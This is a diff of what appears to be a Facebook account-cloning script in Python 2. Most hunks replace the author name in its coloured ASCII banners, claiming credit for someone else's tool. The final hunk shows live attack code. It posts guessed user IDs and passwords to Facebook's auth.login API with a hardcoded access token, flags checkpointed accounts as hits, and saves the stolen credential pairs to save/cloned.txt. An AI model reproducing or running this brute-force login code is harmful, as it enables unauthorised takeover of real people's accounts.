@@ -88,11 +88,11 @@ print  """
 |_|  |___/  |_|    \___||_||_| \___/   
                                        
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;94m[✍︎] \033[1;94mDEVELOPER : PSYCHO PICCHI 
+\033[1;94m[✍︎] \033[1;94mDEVELOPER : MAHDI HASAN SHUVO
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;93m[✍︎] \033[1;93mFACEBOOK  : PSYCHO PICCHI 
+\033[1;93m[✍︎] \033[1;93mFACEBOOK  :  MAHDI HASAN SHUVO
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;92m[✍︎] \033[1;92mGITHIB    : PSYCHO PICCHI 
+\033[1;92m[✍︎] \033[1;92mGITHIB    :  MAHDI-SHUVO 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;95m[✍︎] \033[1;95mUPDATE    : FASTER NOW 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -113,11 +113,11 @@ logo1 = """
 \033[32m|_|  |___/  |_|    \___||_||_| \___/   
                                        
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;94m[✍︎] \033[1;94mDEVELOPER : PSYCHO PICCHI
+\033[1;94m[✍︎] \033[1;94mDEVELOPER : MAHDI HASAN SHUVO
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;93m[✍︎] \033[1;93mFACEBOOK  : PSYCHO PICCHI 
+\033[1;93m[✍︎] \033[1;93mFACEBOOK  : MAHDI HASAN SHUVO 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;92m[✍︎] \033[1;92mGITHIB    : PSYCHO PICCHI 
+\033[1;92m[✍︎] \033[1;92mGITHIB    : MAHDI-SHUVO 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;95m[✍︎] \033[1;95mUPDATE    : FASTER NOW 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -136,11 +136,11 @@ logo2 = """
 \033[32m|_|  |___/  |_|    \___||_||_| \___/   
                                        
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;94m[✍︎] \033[1;94mDEVELOPER : PSYCHO PICCHI 
+\033[1;94m[✍︎] \033[1;94mDEVELOPER : MAHDI HASAN SHUVO
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;93m[✍︎] \033[1;93mFACEBOOK  : PSYCHO PICCHI 
+\033[1;93m[✍︎] \033[1;93mFACEBOOK  : MAHDI HASAN SHUVO
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-\033[1;92m[✍︎] \033[1;92mGITHIB    : PSYCHO PICCHI 
+\033[1;92m[✍︎] \033[1;92mGITHIB    : MAHDI-SHUVO 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 \033[1;95m[✍︎] \033[1;95mUPDATE    : FASTER NOW 
 \033[91m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -224,7 +224,7 @@ def action():
             data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
             q = json.load(data)
             if 'www.facebook.com' in q['error_msg']:
-                print '\x1b[1;91m(PSYCHO-CP)  ' + k + c + user + '  |  ' + pass1 +     '\x1b \x1b[0m \n'                           
+                print '\x1b[1;91m(MAHDI-CP)  ' + k + c + user + '  |  ' + pass1 +     '\x1b \x1b[0m \n'                           
                 okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
